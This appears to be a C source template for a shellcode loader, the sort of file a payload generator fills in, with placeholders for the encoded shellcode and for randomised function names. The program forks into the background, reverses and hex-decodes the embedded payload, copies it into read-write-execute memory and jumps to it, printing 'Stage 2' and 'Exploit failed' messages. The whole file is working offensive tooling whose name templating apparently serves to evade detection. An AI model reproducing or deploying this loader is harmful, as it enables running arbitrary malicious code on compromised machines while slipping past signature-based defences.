#include <stdio.h>
#include <string.h>
#include <strings.h>
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>

unsigned char hexbuffer[] = "{{SHELLCODE_STR}}";


char *{{FUNCTION2}}(char *str)
{
    char *p1, *p2;

    if (! str || ! *str)
        return str;
    for (p1 = str, p2 = str + strlen(str) - 1; p2 > p1; ++p1, --p2)
    {
        *p1 ^= *p2;
        *p2 ^= *p1;
        *p1 ^= *p2;
    }
    return str;
}

unsigned int {{FUNCTION1}}(char* hexbuffer) {
    {{FUNCTION2}}(hexbuffer);
    unsigned int char_in_hex;
    unsigned int iterations = strlen(hexbuffer);
    unsigned int memory_allocation = strlen(hexbuffer) / 2;
    for (unsigned int i = 0; i < iterations - 1; i++) {
        sscanf(hexbuffer + 2 * i, "%2X", &char_in_hex);
        hexbuffer[i] = (char)char_in_hex;
    }
    return memory_allocation;
}

int main(int argc, char **argv)
{
    pid_t process_id = 0;
    pid_t sid = 0;
    process_id = fork();
    if (process_id < 0)
    {
        printf("fork failed!\n");
        exit(1);
    }
    if (process_id > 0)
    {
        printf("[+] Stage 2\n");
        exit(0);
    }

    unsigned int memory_allocation = {{FUNCTION1}}(hexbuffer);
    void *ptr = mmap(0, memory_allocation, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
    memcpy(ptr,hexbuffer,memory_allocation);
    void (*fp)() = (void (*)())ptr;
    fp();
    printf ("\n[-] Exploit failed \n");
}